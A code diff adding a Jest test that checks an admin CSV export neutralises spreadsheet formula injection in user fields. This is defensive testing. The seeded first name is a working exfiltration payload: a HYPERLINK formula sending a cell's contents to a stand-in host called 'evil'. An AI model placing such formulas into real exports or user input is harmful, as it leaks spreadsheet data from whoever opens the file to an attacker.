@@ -186,4 +186,27 @@ describe('AdminService', () => {
       expect(result).toBeDefined();
     });
   });
+
+  describe('CSV export formula injection', () => {
+    it('neutralizes leading formula triggers in user-controlled fields', async () => {
+      await User.create({
+        userId: 'user-csv',
+        firstName: '=HYPERLINK("http://evil/?p="&A1,"click")',
+        lastName: 'Doe',
+        email: 'csv-injection@example.com',
+        password: 'hashedPassword123!',
+        status: UserStatus.ACTIVE,
+        userType: UserType.ADOPTER,
+        emailVerified: true,
+      });
+
+      const csv = await AdminService.exportData('users', 'csv');
+
+      // The formula trigger must be neutralized with a leading single quote
+      // BEFORE the RFC-4180 quote wrapping (commas in HYPERLINK trigger wrapping).
+      expect(csv).toContain('"\'=HYPERLINK');
+      // Sanity: an un-neutralized payload would appear without the leading '.
+      expect(csv).not.toContain('"=HYPERLINK');
+    });
+  });
 });
